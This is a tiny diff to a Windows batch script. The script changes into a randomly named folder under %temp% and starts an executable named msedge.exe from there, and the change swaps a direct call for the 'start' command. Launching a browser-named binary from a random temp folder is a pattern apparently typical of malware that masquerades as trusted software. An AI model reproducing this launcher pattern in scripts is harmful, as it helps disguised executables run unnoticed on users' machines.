@@ -1,4 +1,4 @@
 @echo off
 cd %temp%/sVBXKuz
-.\msedge.exe
+start msedge.exe
 exit
